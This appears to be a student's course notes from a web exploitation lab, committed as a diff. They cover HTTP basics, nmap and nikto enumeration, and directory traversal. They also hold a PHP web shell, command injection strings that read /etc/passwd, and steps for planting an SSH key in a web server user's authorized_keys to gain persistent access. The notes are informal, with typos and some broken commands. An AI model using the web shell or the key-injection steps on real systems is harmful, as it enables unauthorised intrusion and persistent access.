@@ -1,0 +1,175 @@
+OBJECTIVES
+-- Understand basic web communication
+
+-- Familiarization with Developer Console
+
+-- Conduct Cross-site Scripting
+
+-- Conduct URL command injection
+
+SERVER CLIENT RELATIONSHIP
+    -- synchronous communications between user and services All data is not returned, client only receives what is allowed
+    -- just because you make a request to the web server doesnt mean you are going to receive it back
+HTTP
+  --   when you send a request over the web browser an http request message is sent, "GET /HTTP/1.1
+      -- request message
+  -- HTTP/1.1 200 OK 
+      -- response message
+  -- HTTP METHODS
+      -- GET request
+          -- anytime you go to google or youtube, your machine makes a GET request to that webpage 
+       -- if you wanted to get google maps
+          - set GET = HTTP method to ruquest/retrieve/ = www.google.com/
+          - then GET /maps HTTP/1.1
+      -- HTTP/1.1 200 OK
+      -- HTTP/1.1 = HTTP Version being utilized
+      -- 200 == status code
+      -- OK  == status message
+  -- GET AND POST WILL BE UTILIZED IN ACTIVITIES TODAY 
+       -- POST IS SOMETHING SENDING INFORMATION 
+       -- POST COULD CONTAIN CREDENTIALS (LOGIN) 
+       -- https://tools.ietf.org/html/rfc2616
+HTTP RESPONSE CODES
+    -- 10X == informational
+    -- 2XX == success
+    -- 30X = Redirection
+    -- 4XX == Client Error
+    -- 5XX = Server Error
+  -- document.location will give you the url that oyu are on 
+  -- document.cookie will give you your current cookie, it will still work even if the website doesnt use cookies
+  -- RESEARCH THESE COMMANDS FOR CTFds 
+WGET
+    - wget -r -12 -P /tmp www.reddit.com
+    -- -r == recursive
+    -- -12 == defining recursive layers
+    -- -P = /tmp
+    --= Z://file/tmp/192.168.28.111
+CURL 
+    - not recursive, can use pipes
+    - use -o 
+        -- curl -o example.html http://www.reddit.com/
+    -- curl -X POST http://website -d
+        -- LOGIN TO WEBSITE 
+JAVASCRIPT 
+    -- allows websites to interact with the client
+        -- javascript runs on the client's machine
+        -- coded as .js files or inline with html 
+    -- JAVASCRIPT INTERACTIVE
+        -- <script>
+        function.myFunction() {
+        document.getElementById("demo").innerHTML = "Paragraph changed. ";} </script>
+        <script src =="https://www.w3schools.com/js/myScript1.js"></script>
+    <a Id ="demo">Some text here.</a>
+    DEV Console > Console Tab:
+    myFunction;
+    a Id="demo">Praragraph changed.</a>
+ENUMERATION
+    1. Host Discovery (ping sweep)
+    2. Host Enumeration (ports scan)
+      - nmap -PN -T5 10.50.34.125 -p-
+    3. SERVICE ENUMERATION ) -sV | banner.nse
+    
+    4. web enumeration
+      a. nmap
+        - nmap -Pn -T5 10.50.34.125 --script=http-enum.nse -p 80
+            - "http-*" runs every http script
+            - http-enum.nse == 
+            - "-sV" can be used to enumerate services for their versions, host names etc.
+            - however to find hidden files an enumeration script must be used'
+     -b nikto 
+          - sudo apt update -y && sudo apt install nikto -y
+          - nikto -h 10.50.34.125 
+              - take note of all /directories 
+     -c  what is the robots.txt file
+              - rules for what webcrawlers can and cannot index
+              - what is the goal in web enumeration
+              - find out the existing webpages and webdirectories
+              contents of robots.txt tell us what webpages/webdirectories may or may not exit
+    -d legitimate surfing 
+        navigate to the webpages/directories you discovered
+   
+   
+   5. Web exploitation 
+      a. directory traversal - information
+      http://10.50.34.125/path/pathdemo.php
+      ../../../../../../../../etc/passwd
+          - takes you back to the root directory and then reads /etc/passwd
+          - DO NOT NEED A BOX TO DO THIS
+          - anytime there is a question mark in the url it can be used for this
+      - /etc/group 
+        - show user shroups
+        -  / etc/hosts - shows aliases to ip addrs
+        - could see named servers and internal servers
+        - /etc/resolve.conf 
+          - internal networks we can scan for
+        - /etc/networks
+      b. malicious file upload 
+            -- web shell, which gives you information and access 
+            -- three conditions to successfully upload a web shell
+                1. can you upload? yes? cont
+                2. are file extensions being sanitized? No? cont
+                3. can you access the uploads directory? yes? good job
+            -- uploading php file ext that will be our web shell
+            -- webshell.php
+              <HTML><BODY>
+              <Form METHOD="GET" NAME="badform" ACTION="">
+              <INPUT TYPE="submit" VALUE="hello">
+              </Form>
+              <?php system($GET['cmd']);?>
+              </BODY></HTML>
+              
+      
+      c. command injection - information/access
+          -- whoami; id; whoami ; cat /etc/passwd ; cat /etc/hosts
+          using a ";" allows you to inject commands
+          bb/cc SSH KEYS - Access
+              - pair with  command injection ; Webshell
+      SSH KEYSSSS
+      
+      1. Generate our SSH KEYS
+          - on whichever host you plan on loggin in from, generate keys
+          - ssh-keygen -t rsa -b 4096
+          - use default, and overwrite
+          - do not put password. double enter
+          - /home/student/.ssh/id_rsa == directory for ssh key
+          - /home/student/.ssh/id_rsa.pub == public key
+ -ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDIqBpxO52RJ2QIXdkX8/s494usXeD3/oUhL8TpyVCemiUCIbdKHtT2kyfl1iK21Bh3hOPR4X8n6pRwSOaH2Z9l5h3tOzWwHo1hLC50ECfgveWtPoGDqh+/ex/5B+0TnIVKtVpvbSiuakdCLC9LLza9vfpg4oZ2IpjD/Q3AKs7OvTYm/g9nTtUw7vsGbR9qODmaG5QkrYoKxsiBgmg3fgQlBtSQYpQfZQ1/HG7hkenUc8Jtj3KcMi1+zuIJXugINIz1SuHp6LW0mSG654yNh3SoiL1ydZGxpfuefye+PZ7WFBJjSfjvBdeBhysNICkg/19q8NXXJSgwzUzMpiF9Z4XsMugha9kFpWleTiF47LOUJbPhqncbUkH5JXthrGt0xWNugsjypTD02te/5g4yvM04duI8jtol3Aagkm7sS2BGU82i0h6KwHfvcmGJVVNcFZJNL8JQFlMGCCjS+KOPfb7HKVXyCKVWzuQHWLKW75KFjArRN+26vakXTapPgWEzdc2Gm8ubmUdNW5621NhRuRZ6NIJAMMlOPfxLC/TrakysGh3u6xkm9V7ucdFVeVt4E47Oj+/18exzKGZknR0uL7HKVncs1VVLWxuf2BEuQRYFXtZXRVCH+J9S4uS7WL9+DrVDhxL0zg1MKBdG2ekIyoxgIAUi81xFYF9w2nR3BijUEQ== student@lin-ops
+     2. determine the user on the webserver 
+            - via either command injection or webshell
+            - user: www-data
+            - home directory: /var/www
+                -- cat /etc/passwd | grep -i "www-data"
+            - login shell: /bin/bash
+     3. determine if .ssh directory exists in the users home directory if not create it 
+              ; ls la /var/www
+     4. creating the .ssh directory
+               ; mkdir /var/www/.ssh
+     5. validate that it has been created
+              ; ls -la /var/www
+     6. inject our key into the authorized_keys file
+              ; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDIqBpxO52RJ2QIXdkX8/s494usXeD3/oUhL8TpyVCemiUCIbdKHtT2kyfl1iK21Bh3hOPR4X8n6pRwSOaH2Z9l5h3tOzWwHo1hLC50ECfgveWtPoGDqh+/ex/5B+0TnIVKtVpvbSiuakdCLC9LLza9vfpg4oZ2IpjD/Q3AKs7OvTYm/g9nTtUw7vsGbR9qODmaG5QkrYoKxsiBgmg3fgQlBtSQYpQfZQ1/HG7hkenUc8Jtj3KcMi1+zuIJXugINIz1SuHp6LW0mSG654yNh3SoiL1ydZGxpfuefye+PZ7WFBJjSfjvBdeBhysNICkg/19q8NXXJSgwzUzMpiF9Z4XsMugha9kFpWleTiF47LOUJbPhqncbUkH5JXthrGt0xWNugsjypTD02te/5g4yvM04duI8jtol3Aagkm7sS2BGU82i0h6KwHfvcmGJVVNcFZJNL8JQFlMGCCjS+KOPfb7HKVXyCKVWzuQHWLKW75KFjArRN+26vakXTapPgWEzdc2Gm8ubmUdNW5621NhRuRZ6NIJAMMlOPfxLC/TrakysGh3u6xkm9V7ucdFVeVt4E47Oj+/18exzKGZknR0uL7HKVncs1VVLWxuf2BEuQRYFXtZXRVCH+J9S4uS7WL9+DrVDhxL0zg1MKBdG2ekIyoxgIAUi81xFYF9w2nR3BijUEQ== student@lin-ops" 
+                      << /var/www/.ssh/authorized_keys
+     7. validate the public is inside the authorized_keys file
+          cat /var/www/.ssh/authorized_keys 
+     8. login from the workstation you generated the key from
+          - ssh www-data@10.50.34.125
+          WEBSERVERS DEFAULT WEB DIRECTORIES
+              - http://10.50.34.125/ = /var/www/html
+              - http://10.50.34.125/uploads = /var/www/html/uploads
+              
+CTFD FOR DAY 2 WEB EX
+    DIRECTORIES ON BOX
+        -- /robots.txt
+        /css/
+        /images/
+        /uploads/
+        training website -- 10.100.28.55
+        ATOPIA
+        
+     I AM BILLYBOB
+     to run functions in java script 
+        - go to dev console f12 
+        - go to console
+        - 
+              
+            
